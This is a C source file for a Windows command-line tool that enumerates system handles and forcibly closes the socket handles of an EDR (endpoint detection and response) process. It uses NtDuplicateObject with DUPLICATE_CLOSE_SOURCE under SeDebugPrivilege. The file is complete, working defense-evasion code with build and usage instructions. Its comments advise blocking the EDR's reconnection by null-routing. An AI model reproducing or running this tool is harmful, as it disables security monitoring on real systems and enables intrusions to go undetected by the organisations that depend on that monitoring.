/*
 * 13_handle_theft.c
 * Socket Handle Theft — forcibly close EDR socket handles
 *
 * Algorithm:
 *   1. NtQuerySystemInformation(SystemHandleInformation) — enumerate all handles
 *   2. For each handle owned by EDR process: check type == "File" (sockets are file objects)
 *   3. NtDuplicateObject with DUPLICATE_CLOSE_SOURCE — closes the handle in the source process
 *      while giving us a copy (which we immediately close).
 *
 * Effect: EDR's TCP socket becomes invalid. recv()/send() return WSAENOTSOCK or
 * WSAECONNABORTED. The EDR will try to reconnect — combine with NRPT/null-route.
 *
 * This is a user-mode operation — no driver needed.
 * Requires SeDebugPrivilege (Administrator).
 *
 * Build:
 *   cl 13_handle_theft.c /link ntdll.lib
 *   (or link statically: link to ntdll.lib from WDK or use GetProcAddress below)
 *
 * Usage:
 *   13_handle_theft.exe list <pid>           List all handles for a PID
 *   13_handle_theft.exe steal <pid>          Close all socket handles for a PID
 *   13_handle_theft.exe steal-by-name <name> Find process by name and steal sockets
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <tlhelp32.h>

/* ---- NT Native API declarations ---- */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)   ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define SystemHandleInformation 16

typedef struct _SYSTEM_HANDLE_ENTRY {
    USHORT UniqueProcessId;        /* matches NtQuerySystemInformation layout */
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_ENTRY, *PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    /* ... more fields ... */
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation = 0,
    ObjectNameInformation  = 1,
    ObjectTypeInformation  = 2,
} OBJECT_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtDuplicateObject)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG Attributes,
    ULONG Options
);

typedef NTSTATUS (NTAPI *PFN_NtQueryObject)(
    HANDLE Handle,
    OBJECT_INFORMATION_CLASS InformationClass,
    PVOID Information,
    ULONG Length,
    PULONG ResultLength
);

#define DUPLICATE_CLOSE_SOURCE 0x00000001

static PFN_NtQuerySystemInformation  NtQuerySystemInformation;
static PFN_NtDuplicateObject         NtDuplicateObject;
static PFN_NtQueryObject             NtQueryObject;

static BOOL LoadNtApis(void)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    NtQuerySystemInformation = (PFN_NtQuerySystemInformation)
        GetProcAddress(hNtdll, "NtQuerySystemInformation");
    NtDuplicateObject = (PFN_NtDuplicateObject)
        GetProcAddress(hNtdll, "NtDuplicateObject");
    NtQueryObject = (PFN_NtQueryObject)
        GetProcAddress(hNtdll, "NtQueryObject");

    return NtQuerySystemInformation && NtDuplicateObject && NtQueryObject;
}

/* Enable SeDebugPrivilege */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

/* Check if a handle's type name contains "File" (sockets show as \Device\Afd) */
static BOOL IsSocketHandle(HANDLE hProc, HANDLE hDup)
{
    BYTE buf[1024] = {0};
    ULONG retLen = 0;
    NTSTATUS st = NtQueryObject(hDup, ObjectTypeInformation, buf, sizeof(buf), &retLen);
    if (!NT_SUCCESS(st)) return FALSE;

    POBJECT_TYPE_INFORMATION pType = (POBJECT_TYPE_INFORMATION)buf;
    /* Socket handles have type "File" */
    if (pType->TypeName.Buffer &&
        wcsncmp(pType->TypeName.Buffer, L"File", 4) == 0)
    {
        /* Query the name — socket shows as \Device\Afd */
        BYTE nameBuf[1024] = {0};
        st = NtQueryObject(hDup, ObjectNameInformation, nameBuf, sizeof(nameBuf), &retLen);
        if (NT_SUCCESS(st)) {
            PUNICODE_STRING pName = (PUNICODE_STRING)nameBuf;
            if (pName->Buffer && wcsstr(pName->Buffer, L"\\Device\\Afd"))
                return TRUE;
        }
    }
    return FALSE;
}

/* Get all system handles. Caller frees returned buffer. */
static PSYSTEM_HANDLE_INFORMATION GetAllHandles(void)
{
    ULONG size = 1024 * 64;
    PSYSTEM_HANDLE_INFORMATION pInfo = NULL;

    for (;;) {
        pInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), 0, size);
        ULONG retLen = 0;
        NTSTATUS st = NtQuerySystemInformation(
            SystemHandleInformation, pInfo, size, &retLen
        );
        if (NT_SUCCESS(st)) break;
        HeapFree(GetProcessHeap(), 0, pInfo);
        pInfo = NULL;
        if (st != STATUS_INFO_LENGTH_MISMATCH) {
            wprintf(L"[-] NtQuerySystemInformation failed: 0x%08X\n", (UINT)st);
            break;
        }
        size *= 2;
    }
    return pInfo;
}

/* Find process ID by name */
static DWORD FindPidByName(const WCHAR *name)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

/* List or steal all socket handles for a given PID */
static DWORD ProcessHandles(DWORD targetPid, BOOL steal)
{
    PSYSTEM_HANDLE_INFORMATION pHandles = GetAllHandles();
    if (!pHandles) return 0;

    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(%lu) failed: %lu\n", targetPid, GetLastError());
        HeapFree(GetProcessHeap(), 0, pHandles);
        return 0;
    }

    DWORD count = 0;

    for (ULONG i = 0; i < pHandles->HandleCount; i++) {
        SYSTEM_HANDLE_ENTRY *e = &pHandles->Handles[i];
        if (e->UniqueProcessId != (USHORT)targetPid) continue;

        HANDLE hDup = NULL;
        /* Duplicate with QUERY access to check type — WITHOUT CLOSE_SOURCE */
        NTSTATUS st = NtDuplicateObject(
            hProc, (HANDLE)(ULONG_PTR)e->HandleValue,
            GetCurrentProcess(), &hDup,
            GENERIC_READ, 0, 0
        );
        if (!NT_SUCCESS(st)) continue;

        BOOL isSocket = IsSocketHandle(hProc, hDup);
        CloseHandle(hDup);

        if (!isSocket) continue;

        count++;

        if (steal) {
            /* Duplicate with DUPLICATE_CLOSE_SOURCE — closes original in target process */
            HANDLE hStealed = NULL;
            st = NtDuplicateObject(
                hProc, (HANDLE)(ULONG_PTR)e->HandleValue,
                GetCurrentProcess(), &hStealed,
                0, 0, DUPLICATE_CLOSE_SOURCE
            );
            if (NT_SUCCESS(st)) {
                wprintf(L"  [+] Closed handle 0x%04X (socket) in PID %lu\n",
                        e->HandleValue, targetPid);
                CloseHandle(hStealed);
            } else {
                wprintf(L"  [-] Failed to steal handle 0x%04X: 0x%08X\n",
                        e->HandleValue, (UINT)st);
            }
        } else {
            wprintf(L"  Socket handle: 0x%04X  Access=0x%08X\n",
                    e->HandleValue, e->GrantedAccess);
        }
    }

    CloseHandle(hProc);
    HeapFree(GetProcessHeap(), 0, pHandles);
    return count;
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] Socket Handle Theft Tool\n\n");

    if (!LoadNtApis()) {
        wprintf(L"[-] Failed to load NT APIs from ntdll.dll\n");
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        wprintf(L"[-] Could not enable SeDebugPrivilege (need Administrator)\n");
        return 1;
    }
    wprintf(L"[+] SeDebugPrivilege enabled\n\n");

    if (argc < 3) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s list <pid>            List socket handles for PID\n", argv[0]);
        wprintf(L"  %s steal <pid>           Steal (close) all socket handles in PID\n", argv[0]);
        wprintf(L"  %s steal-by-name <name>  Find process and steal sockets\n", argv[0]);
        return 1;
    }

    DWORD pid = 0;

    if (_wcsicmp(argv[1], L"list") == 0) {
        pid = (DWORD)_wtoi(argv[2]);
        wprintf(L"[*] Listing socket handles for PID %lu...\n\n", pid);
        DWORD n = ProcessHandles(pid, FALSE);
        wprintf(L"\n[*] Found %lu socket handle(s)\n", n);
        return 0;
    }

    if (_wcsicmp(argv[1], L"steal") == 0) {
        pid = (DWORD)_wtoi(argv[2]);
        wprintf(L"[*] Stealing socket handles from PID %lu...\n\n", pid);
        DWORD n = ProcessHandles(pid, TRUE);
        wprintf(L"\n[+] Closed %lu socket handle(s)\n", n);
        wprintf(L"[*] EDR must re-establish connections (block with NRPT/null-route)\n");
        return 0;
    }

    if (_wcsicmp(argv[1], L"steal-by-name") == 0) {
        pid = FindPidByName(argv[2]);
        if (pid == 0) {
            wprintf(L"[-] Process not found: %s\n", argv[2]);
            return 1;
        }
        wprintf(L"[*] Found %s at PID %lu\n", argv[2], pid);
        wprintf(L"[*] Stealing socket handles...\n\n");
        DWORD n = ProcessHandles(pid, TRUE);
        wprintf(L"\n[+] Closed %lu socket handle(s)\n", n);
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
